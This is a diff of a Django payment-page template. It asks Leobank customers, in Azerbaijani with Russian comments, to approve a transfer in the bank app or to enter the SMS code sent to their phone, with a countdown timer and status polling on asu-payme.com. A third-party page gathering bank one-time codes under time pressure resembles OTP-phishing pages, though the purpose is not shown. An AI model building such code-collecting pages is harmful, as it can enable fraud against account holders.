@@ -4,9 +4,8 @@
 {% block content %}
 
 
-
 <div class="container margin: auto" style="max-width: 500px;">
-  <div class="card" style="padding-left: 1px; padding-right: 1px; padding-bottom:1px; background: #efefef">
+  <div class="card"  style="background: #efefef">
 
     <div class="card-header">
       <div class="row">
@@ -24,49 +23,50 @@
       </div>
     </div>
 
-
-    <form method="POST" enctype="multipart/form-data">
+    <div class="card-body justify-content-center align-items-center text-center">
+      <form method="POST" enctype="multipart/form-data">
+      <div id="time_is_up" style="display: none">Vaxt bitdi, zəhmət olmasa səhifəyə qayıdın və yeni sorğu yaradın</div>  {# Таймер истёк, вернитесь пожалуйста  на сайт и создайте новую заявку #}
       {% csrf_token %}
+      {% if not phone_script.step_2_required %} {# Если смс не требуется #}
+        <div class="row">
+          Ödənişi təstiqləmək üçün Leobank mobil tədbiqində Sizə bildiriş gələcək.
+             Zəhmət olmasa, Leobank mobil tədbiqinə keçid edin və köçürməni təstiq edin {# .(Вам в приложении Леобанка придет уведомление для подтверждения  платежа. Перейдите пожалуйста  в приложении  лео банка и подтвердите перевод в приложении) #}
+        </div>
+        <input  type="submit" value="Продолжить" class="btn btn-success">
+      {% else %}  {# Если смс требуется #}
+        <div id="send_sms_btn" style="display: block" class="row justify-content-center align-items-center text-center">
+          <div class="row">Zəhmət olmasa telefonunuza gələn SMS kodunu daxil edin və SMS Göndər düyməsini basın!{# пожалуйста  смс код который пришёл на ваш телефон введите #}
+          </div>
+          <div class="row">
+          {% include 'includes/form_error.html' %}
+          <div  class="col-6">
+            <input class="icon" type="text" name="sms_code" placeholder="SMS kodu" minlength="4" maxlength="6" id="id_sms_code">
+          </div>
+          <div class="col-6">
+            <input id="sms" type="submit" value="SMS Göndər" class="btn btn-success placeicon"> {# отправить код   смс #}
+          </div>
+        </div>
+      </div>
+      {% endif %}
+
+      </form>
 
 
-        {% if not phone_script.step_2_required  %}
-                        <div>
-                            <p>Ödənişi təstiqləmək üçün Leobank mobil tədbiqində Sizə bildiriş gələcək.
-                            Zəhmət olmasa, Leobank mobil tədbiqinə keçid edin və köçürməni təstiq edin</p> {# .(Вам в приложении Леобанка придет уведомление для подтверждения  платежа. Перейдите пожалуйста  в приложении  лео банка и подтвердите перевод в приложении) #}
-                        </div>
-                        <input  type="submit" value="Продолжить" class="btn btn-success placeicon">
-                    {% else %}
-                    <span id="send_sms_btn">
-                <p>Zəhmət olmasa telefonunuza gələn SMS kodunu daxil edin və SMS Göndər düyməsini basın!</p> {# пожалуйста  смс код который пришёл на ваш телефон введите #}
-                      {% include 'includes/form_error.html' %}
-                        <div  class=" col-6">
-                    <input class="icon" type="text" name="sms_code" placeholder="SMS kodu" minlength="4" maxlength="6" id="id_sms_code">
-                </div>
-
-                <div class="row">
-                    <div class="col-md-6">
-                        <input id="wwq" type="submit" value="SMS Göndər" class="btn btn-success placeicon"> {# отправить код   смс #}
-                    </div>
-                </div>
-            </span>
-            {% endif %}
-
-                    <p id="time_is_up" style="display: none">Vaxt bitdi, zəhmət olmasa səhifəyə qayıdın və yeni sorğu yaradın</p>  {# Таймер истёк, вернитесь пожалуйста  на сайт и создайте новую заявку #}
-
-    </form>
-
-                    <div class="row"  style="height: 50px">
-                                <div class="col-9 d-flex justify-content-center align-items-center">
-                                    {% if payment.status == 0 %}
-                                    Əməliyyat üçün qalan vaxt: {# время на совершенние оплаты #}
-                                    {% elif payment.status == 3 %}
-                                    SMS üçün qalan vaxt: {# время для ввода смс #}
-                                    {% endif %}
-                                    </div>
-                                <div class="col-1">
-                                            {% include 'includes/timer_circle.html' %}
-                                </div>
-                    </div>
+    </div>
+    <div class="card-footer">
+      <div class="row">
+      <div class="col-9 d-flex justify-content-center align-items-center">
+                        {% if payment.status == 0 %}
+                        Əməliyyat üçün qalan vaxt: {# время на совершенние оплаты #}
+                        {% elif payment.status == 4 %}
+                        SMS üçün qalan vaxt: {# время для ввода смс #}
+                        {% endif %}
+      </div>
+      <div class="col-1">
+           {% include 'includes/timer_circle.html' %}
+      </div>
+      </div>
+    </div>
   </div>
 </div>
 
@@ -88,7 +88,7 @@ fetch('https://asu-payme.com/api/v1/payment_status/{{payment.id}}/', {
        }
        })
 }
-        setTimeout(() => { getStatus() }, 3000);
+setTimeout(() => { getStatus() }, 3000);
 </script>
 
 {% endblock %}
